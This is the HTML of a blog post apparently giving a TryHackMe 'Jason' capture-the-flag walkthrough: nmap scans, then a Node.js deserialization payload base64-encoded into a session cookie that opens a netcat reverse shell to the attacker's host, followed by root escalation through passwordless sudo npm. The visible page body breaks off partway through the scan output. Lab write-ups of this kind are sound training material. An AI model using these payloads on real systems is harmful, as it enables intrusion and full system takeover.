<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="ðŸ“† 03/09/2022 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Jason
In JavaScript everything is a terrible mistake.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/jason/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - Jason"><meta property="og:description" content="ðŸ“† 03/09/2022 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Jason
In JavaScript everything is a terrible mistake.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/jason/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - Jason"><meta name=twitter:description content="ðŸ“† 03/09/2022 - geobour98 âŒš 7 min
Introduction This is a TryHackMe room which can be found at: Jason
In JavaScript everything is a terrible mistake.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - Jason","item":"https://geobour98.com/write-ups/thm/jason/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Jason","name":"TryHackMe - Jason","description":"ðŸ“† 03/09/2022 - geobour98 âŒš 7 min\nIntroduction This is a TryHackMe room which can be found at: Jason\nIn JavaScript everything is a terrible mistake.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0.","keywords":[],"articleBody":"ðŸ“† 03/09/2022 - geobour98 âŒš 7 min\nIntroduction This is a TryHackMe room which can be found at: Jason\nIn JavaScript everything is a terrible mistake.\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0.07s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:39 Completed Parallel DNS resolution of 1 host. at 19:39, 0.00s elapsed Initiating Connect Scan at 19:39 Scanning 10.10.121.122 (10.10.121.122) [65535 ports] Discovered open port 80/tcp on 10.10.121.122 Discovered open port 22/tcp on 10.10.121.122 Connect Scan Timing: About 42.14% done; ETC: 19:40 (0:00:43 remaining) Completed Connect Scan at 19:40, 63.87s elapsed (65535 total ports) Nmap scan report for 10.10.121.122 (10.10.121.122) Host is up (0.068s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 63.97 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 10.10.121.122  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:41 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating Ping Scan at 19:41 Scanning 10.10.121.122 [4 ports] Completed Ping Scan at 19:41, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:41 Completed Parallel DNS resolution of 1 host. at 19:41, 0.00s elapsed Initiating SYN Stealth Scan at 19:41 Scanning 10.10.121.122 (10.10.121.122) [2 ports] Discovered open port 22/tcp on 10.10.121.122 Discovered open port 80/tcp on 10.10.121.122 Completed SYN Stealth Scan at 19:41, 0.12s elapsed (2 total ports) Initiating Service scan at 19:41 Scanning 2 services on 10.10.121.122 (10.10.121.122) Completed Service scan at 19:41, 15.27s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.121.122 (10.10.121.122) Retrying OS detection (try #2) against 10.10.121.122 (10.10.121.122) Initiating Traceroute at 19:41 Completed Traceroute at 19:41, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 19:41 Completed Parallel DNS resolution of 1 host. at 19:41, 0.00s elapsed NSE: Script scanning 10.10.121.122. Initiating NSE at 19:41 Completed NSE at 19:41, 3.53s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.14s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Nmap scan report for 10.10.121.122 (10.10.121.122) Host is up (0.069s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA) | 256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA) |_ 256 12ðŸ†Ž13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519) 80/tcp open http |_http-favicon: Unknown favicon MD5: 8FCEA7DE73B9ED47DE799DB3AE6363A8 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Content-Type: text/html | Date: Wed, 31 Aug 2022 16:41:22 GMT | Connection: close |  | Horror LLC |  | body { | background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b); | background-size: 300% 300%; | -webkit-animation: Background 10s ease infinite; | -moz-animation: Background 10s ease infinite; | animation: Background 10s ease infinite; | @-webkit-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @-moz-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @keyframes Background { | background-position: 0% 50% | background-posi | HTTPOptions: | HTTP/1.1 200 OK | Content-Type: text/html | Date: Wed, 31 Aug 2022 16:41:23 GMT | Connection: close |  | Horror LLC |  | body { | background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b); | background-size: 300% 300%; | -webkit-animation: Background 10s ease infinite; | -moz-animation: Background 10s ease infinite; | animation: Background 10s ease infinite; | @-webkit-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @-moz-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @keyframes Background { | background-position: 0% 50% |_ background-posi | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Horror LLC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.92%I=7%D=8/31%Time=630F8F33%P=x86_64-pc-linux-gnu%r(GetR SF:equest,E4B,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20text/html\\r\\nDat SF:e:\\x20Wed,\\x2031\\x20Aug\\x202022\\x2016:41:22\\x20GMT\\r\\nConnection:\\x20cl SF:ose\\r\\n\\r\\n\\nHorror\\x20LLC\\n\\n\\x20\\x2 SF:0body\\x20{\\n\\x20\\x20\\x20\\x20background:\\x20linear-gradient\\(253deg,\\x20 SF:#4a040d,\\x20#3b0b54,\\x20#3a343b\\);\\n\\x20\\x20\\x20\\x20background-size:\\x2 SF:0300%\\x20300%;\\n\\x20\\x20\\x20\\x20-webkit-animation:\\x20Background\\x2010s SF:\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\x20-moz-animation:\\x20Background\\x2 SF:010s\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\x20animation:\\x20Background\\x20 SF:10s\\x20ease\\x20infinite;\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@-webkit-keyfram SF:es\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x2 SF:0background-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20 SF:50%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x20100%\\x2050%\\n SF:\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20100%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20b SF:ackground-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20}\\n\\x20\\x2 SF:0\\n\\x20\\x20@-moz-keyframes\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20\\x20\\x2 SF:0\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-po SF:sition:\\x20100%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20100%\\x20{\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\ SF:x20}\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@keyframes\\x20Background\\x20{\\n\\x20\\ SF:x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\ SF:x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20background-posi\")%r(HTTPOptions,E4B,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nCo SF:ntent-Type:\\x20text/html\\r\\nDate:\\x20Wed,\\x2031\\x20Aug\\x202022\\x2016:41 SF::23\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\\nHorror\\x SF:20LLC\\n\\n\\x20\\x20body\\x20{\\n\\x20\\x20\\x20\\x20background:\\ SF:x20linear-gradient\\(253deg,\\x20#4a040d,\\x20#3b0b54,\\x20#3a343b\\);\\n\\x20 SF:\\x20\\x20\\x20background-size:\\x20300%\\x20300%;\\n\\x20\\x20\\x20\\x20-webkit- SF:animation:\\x20Background\\x2010s\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\x20- SF:moz-animation:\\x20Background\\x2010s\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\ SF:x20animation:\\x20Background\\x2010s\\x20ease\\x20infinite;\\n\\x20\\x20}\\n\\x2 SF:0\\x20\\n\\x20\\x20@-webkit-keyframes\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200 SF:%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20 SF:\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20backgr SF:ound-position:\\x20100%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20100%\\ SF:x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20\\x SF:20\\x20\\x20}\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@-moz-keyframes\\x20Background SF:\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-posi SF:tion:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x SF:20\\x20\\x20\\x20\\x20background-position:\\x20100%\\x2050%\\n\\x20\\x20\\x20\\x20 SF:}\\n\\x20\\x20\\x20\\x20100%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-positi SFðŸ”›\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@keyf SF:rames\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20 SF:\\x20background-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\ SF:x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-posi\"); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 24.723 days (since Sun Aug 7 02:20:54 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=255 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 69.85 ms 10.8.0.1 (10.8.0.1) 2 68.05 ms 10.10.121.122 (10.10.121.122)  NSE: Script Post-scanning. Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds  Raw packets sent: 75 (5.900KB) | Rcvd: 57 (4.656KB) Navigate to port 80, in the Email address field put test@test.com, open Burp Suite and Intercept the request. Then send it to Repeater. The request should look like this:\nPOST /?email=test@test.com HTTP/1.1 Host: 10.10.121.122 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Origin: http://10.10.121.122 Connection: close Referer: http://10.10.121.122/ Content-Length: 0 Click the Send button and notice the response:\nHTTP/1.1 200 OK Set-Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==; Max-Age=900000; HttpOnly, Secure Content-Type: text/html Date: Wed, 31 Aug 2022 16:48:27 GMT Connection: close Content-Length: 3559  [REDACTED] In the Set-Cookie header if we decode the session value from base64 we identify a serialized object.\n  Command: echo -n \"eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==\" | base64 -d  geobour98@kali:~$ echo -n \"eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==\" | base64 -d {\"email\":\"test@test.com\"} Exploitation Go in Decoder in Burp Suite and craft a serialized object like this:\n{\"email\":\"_$$ND_FUNC$$_function (){require('child_process').exec(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u00261|nc 10.8.200.50 443 /tmp/f\\\", function(error, stdout, stderr) { console.log(stdout) });}()\"} Click on Encode as and select Base64 so the output should look like this:\neyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 Next, go to http://10.10.121.122, refresh the page, Intercept the request, add a Cookie header with the base64 encoded value into the session. The request should look like this:\nGET / HTTP/1.1 Host: 10.10.121.122 Cookie: session=eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Open a netcat listener and click Forward and we get a reverse shell as dylan\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.121.122] 53470 /bin/sh: 0: can't access tty; job control turned off $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' dylan@jason:/opt/webapp$ whoami whoami dylan dylan@jason:/opt/webapp$ The server performed deserialization of the Cookie header so the reverse shell was executed. The payload used can be found in this great article: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/, which is about Node.js deserialization as in our case. We can also read the user.txt flag:\ndylan@jason:/opt/webapp$ cd /home/dylan cd /home/dylan dylan@jason:~$ cat user.txt cat user.txt [REDACTED] Privilege Escalation After executing the command: sudo -l we see that we can execute npm without being asked for root password.\ndylan@jason:~$ sudo -l sudo -l Matching Defaults entries for dylan on jason:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User dylan may run the following commands on jason:  (ALL) NOPASSWD: /usr/bin/npm * A great exploit for this can be found on: https://gtfobins.github.io/gtfobins/npm/#sudo\ndylan@jason:~$ TF=$(mktemp -d) dylan@jason:~$ echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}'  $TF/package.json dylan@jason:~$ sudo npm -C $TF --unsafe-perm i sudo npm -C $TF --unsafe-perm i   @ preinstall /tmp/tmp.DaaEyPR9DZ  /bin/sh  # bash bash root@jason:/tmp/tmp.DaaEyPR9DZ# id id uid=0(root) gid=0(root) groups=0(root) root@jason:/tmp/tmp.DaaEyPR9DZ# cd /root cd /root root@jason:~# cat root.txt cat root.txt [REDACTED] Proof of Concept (PoC image): web base64 deserialization node.js sudo npm gtfobins  ","wordCount":"1421","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/jason/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - Jason</h1><div class=post-meta></div></header><div class=post-content><p>ðŸ“† 03/09/2022 - geobour98<br>âŒš 7 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/jason target=_blank style=color:#e30f0f>Jason</a></p><p>In JavaScript everything is a terrible mistake.</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 10.10.121.122</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-31 19:39 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 19:39
</span></span><span style=display:flex><span>Scanning 10.10.121.122 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 19:39, 0.07s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:39
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:39, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 19:39
</span></span><span style=display:flex><span>Scanning 10.10.121.122 <span style=color:#f92672>(</span>10.10.121.122<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 80/tcp on 10.10.121.122
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.121.122
</span></span><span style=display:flex><span>Connect Scan Timing: About 42.14% <span style=color:#66d9ef>done</span>; ETC: 19:40 <span style=color:#f92672>(</span>0:00:43 remaining<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Connect Scan at 19:40, 63.87s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.121.122 <span style=color:#f92672>(</span>10.10.121.122<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.068s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 63.97 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,80 -v 10.10.121.122</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 10.10.121.122
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-31 19:41 EEST
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 19:41
</span></span><span style=display:flex><span>Completed NSE at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Ping Scan at 19:41
</span></span><span style=display:flex><span>Scanning 10.10.121.122 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 19:41, 0.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:41
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 19:41, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 19:41
